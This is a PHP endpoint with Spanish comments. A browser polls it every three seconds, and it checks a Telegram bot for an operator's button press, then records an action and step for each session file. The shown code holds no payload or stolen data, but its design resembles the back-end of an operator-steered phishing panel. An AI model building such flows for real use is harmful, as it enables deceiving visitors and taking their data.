<?php
/**
 * ================================================================
 * API Poll — Consulta estado de aprobación desde el backend
 * ================================================================
 * El frontend consulta este endpoint cada 3 segundos.
 * El backend verifica en Telegram y devuelve la acción.
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');

$config   = require __DIR__ . '/../config.php';
$botToken = $config['bot_token'];

$sessionId = $_GET['sessionId'] ?? ($_POST['sessionId'] ?? '');
if (empty($sessionId) || !preg_match('/^sess_[a-zA-Z0-9]+$/', $sessionId)) {
    echo json_encode(['ok' => false, 'error' => 'sessionId inválido']);
    exit;
}

$sessionFile = __DIR__ . "/../data/{$sessionId}.json";
if (!file_exists($sessionFile)) {
    echo json_encode(['ok' => false, 'error' => 'Sesión no encontrada']);
    exit;
}

// ── Leer sesión con lock ──
$session = [];
$fp = fopen($sessionFile, 'r+');
if ($fp && flock($fp, LOCK_SH)) {
    $content = stream_get_contents($fp);
    $session = json_decode($content, true) ?: [];
    flock($fp, LOCK_UN);
    fclose($fp);
}

if (empty($session)) {
    echo json_encode(['ok' => false, 'error' => 'Sesión corrupta']);
    exit;
}

// ── Si ya tiene acción, devolver directamente ──
if ($session['status'] !== 'pending') {
    echo json_encode([
        'ok'     => true,
        'status' => $session['status'],
        'action' => $session['action'],
        'step'   => $session['step']
    ]);
    exit;
}

// ── Consultar Telegram getUpdates ──
$lastUpdateId = $session['lastUpdateId'] ?? 0;
$url = "https://api.telegram.org/bot{$botToken}/getUpdates?offset=" . ($lastUpdateId + 1) . "&limit=100";

$tgResponse = @file_get_contents($url);
if ($tgResponse === false) {
    echo json_encode(['ok' => true, 'status' => 'pending', 'action' => null]);
    exit;
}

$tgData = json_decode($tgResponse, true);
if (!$tgData['ok'] || empty($tgData['result'])) {
    echo json_encode(['ok' => true, 'status' => 'pending', 'action' => null]);
    exit;
}

// ── Procesar updates ──
$foundAction = null;
$foundStep = null;

foreach ($tgData['result'] as $update) {
    $updateId = $update['update_id'];
    if ($updateId > $lastUpdateId) {
        $lastUpdateId = $updateId;
    }

    if (!isset($update['callback_query'])) continue;

    $cb = $update['callback_query'];
    $cbData = $cb['data'] ?? '';
    $cbqId  = $cb['id'] ?? '';

    // Parsear: accion_step_sessionId
    if (!preg_match('/^(\w+)_(\w+)_(sess_[a-zA-Z0-9]+)$/', $cbData, $m)) continue;

    $action    = $m[1];
    $step      = $m[2];
    $sessId    = $m[3];

    // Responder callback inmediatamente
    if ($cbqId) {
        @file_get_contents("https://api.telegram.org/bot{$botToken}/answerCallbackQuery?callback_query_id={$cbqId}");
    }

    // Actualizar archivo de sesión correspondiente
    $sessFile = __DIR__ . "/../data/{$sessId}.json";
    if (!file_exists($sessFile)) continue;

    $sessFp = fopen($sessFile, 'r+');
    if (!$sessFp || !flock($sessFp, LOCK_EX)) continue;

    $sessContent = stream_get_contents($sessFp);
    $sessData = json_decode($sessContent, true) ?: [];

    if ($sessData['status'] === 'pending') {
        $sessData['status'] = 'completed';
        $sessData['action'] = $action;
        $sessData['lastUpdateId'] = $lastUpdateId;

        // Quitar SOLO los botones del mensaje en Telegram (mantener texto original)
        $msgId = $sessData['messageId'] ?? null;
        if ($msgId) {
            $editBody = http_build_query([
                'chat_id'      => $config['chat_id'],
                'message_id'   => $msgId,
                'reply_markup' => json_encode(['inline_keyboard' => []])
            ]);

            $ch = curl_init("https://api.telegram.org/bot{$botToken}/editMessageReplyMarkup");
            curl_setopt_array($ch, [
                CURLOPT_POST           => true,
                CURLOPT_POSTFIELDS     => $editBody,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT        => 10,
                CURLOPT_SSL_VERIFYPEER => true
            ]);
            curl_exec($ch);
            curl_close($ch);
        }

        ftruncate($sessFp, 0);
        rewind($sessFp);
        fwrite($sessFp, json_encode($sessData));
        fflush($sessFp);
    }

    flock($sessFp, LOCK_UN);
    fclose($sessFp);

    // Si es la sesión que estamos consultando, guardar acción
    if ($sessId === $sessionId) {
        $foundAction = $action;
        $foundStep = $step;
    }
}

// ── Actualizar lastUpdateId en la sesión consultada ──
if ($lastUpdateId > ($session['lastUpdateId'] ?? 0)) {
    $fp = fopen($sessionFile, 'r+');
    if ($fp && flock($fp, LOCK_EX)) {
        $session['lastUpdateId'] = $lastUpdateId;
        ftruncate($fp, 0);
        rewind($fp);
        fwrite($fp, json_encode($session));
        fflush($fp);
        flock($fp, LOCK_UN);
        fclose($fp);
    }
}

echo json_encode([
    'ok'     => true,
    'status' => $foundAction ? 'completed' : 'pending',
    'action' => $foundAction,
    'step'   => $foundStep ?? $session['step']
]);
